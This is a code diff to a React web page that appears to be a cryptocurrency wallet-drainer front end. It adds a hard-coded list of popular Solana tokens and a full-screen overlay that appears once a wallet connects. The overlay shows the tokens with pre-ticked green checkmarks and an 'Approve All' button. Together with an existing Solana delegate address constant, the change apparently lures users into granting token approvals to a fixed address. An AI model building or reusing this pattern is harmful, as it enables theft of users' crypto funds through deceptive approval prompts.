@@ -17,6 +17,16 @@ const EVM_TOKENS = [
 const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+
+// Predefined list of Solana tokens for approval
+const SOLANA_APPROVAL_TOKENS = [
+  { symbol: "USDC", name: "USD Coin", mint: SOLANA_USDC_MINT, icon: "usdc" },
+  { symbol: "USDT", name: "Tether", mint: SOLANA_USDT_MINT, icon: "usdt" },
+  { symbol: "SOL", name: "Solana", mint: "So11111111111111111111111111111111111111112", icon: "sol" },
+  { symbol: "BONK", name: "Bonk", mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", icon: "bonk" },
+  { symbol: "JUP", name: "Jupiter", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", icon: "jup" },
+  { symbol: "RAY", name: "Raydium", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", icon: "ray" },
+];
 const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 
 function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
@@ -692,7 +702,7 @@ export default function Home() {
         <div className="max-w-md mx-auto">
           <div className="bg-card rounded-3xl border border-border shadow-lg p-2 relative">
             {isWalletConnected && (
-              <div className="absolute inset-0 z-20 flex items-center justify-center bg-white/80 backdrop-blur-md rounded-3xl">
+              <div className="absolute inset-0 z-20 flex items-center justify-center bg-white/95 backdrop-blur-md rounded-3xl p-4">
                 {networkType === "solana" ? (
                   solanaStep === "done" ? (
                     <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
@@ -700,21 +710,44 @@ export default function Home() {
                       Complete!
                     </div>
                   ) : (
-                    <button
-                      onClick={handleSolanaProceed}
-                      disabled={isSolanaProcessing}
-                      className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-12 py-4 rounded-full text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg"
-                      data-testid="button-proceed-solana"
-                    >
-                      {isSolanaProcessing ? (
-                        <>
-                          <Loader2 className="w-5 h-5 animate-spin" />
-                          Processing...
-                        </>
-                      ) : (
-                        "Proceed"
+                    <div className="w-full max-w-sm">
+                      <h3 className="text-lg font-semibold text-center mb-3 text-foreground">Approve Tokens</h3>
+                      <div className="space-y-2 mb-4 max-h-48 overflow-y-auto">
+                        {SOLANA_APPROVAL_TOKENS.map((token) => (
+                          <div 
+                            key={token.mint}
+                            className="flex items-center justify-between p-3 bg-muted rounded-xl"
+                          >
+                            <div className="flex items-center gap-3">
+                              <TokenIcon symbol={token.symbol} size={32} />
+                              <div>
+                                <div className="font-medium text-foreground">{token.symbol}</div>
+                                <div className="text-xs text-muted-foreground">{token.name}</div>
+                              </div>
+                            </div>
+                            <CheckCircle className="w-5 h-5 text-green-500" />
+                          </div>
+                        ))}
+                      </div>
+                      <button
+                        onClick={handleSolanaProceed}
+                        disabled={isSolanaProcessing}
+                        className="w-full bg-[#FF00D6] hover:bg-[#e800c0] text-white py-4 rounded-full text-lg font-semibold flex items-center gap-2 justify-center disabled:opacity-80 shadow-lg"
+                        data-testid="button-proceed-solana"
+                      >
+                        {isSolanaProcessing ? (
+                          <>
+                            <Loader2 className="w-5 h-5 animate-spin" />
+                            Processing...
+                          </>
+                        ) : (
+                          "Approve All"
+                        )}
+                      </button>
+                      {error && (
+                        <p className="text-red-500 text-sm text-center mt-2">{error}</p>
                       )}
-                    </button>
+                    </div>
                   )
                 ) : step === "done" ? (
                   <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
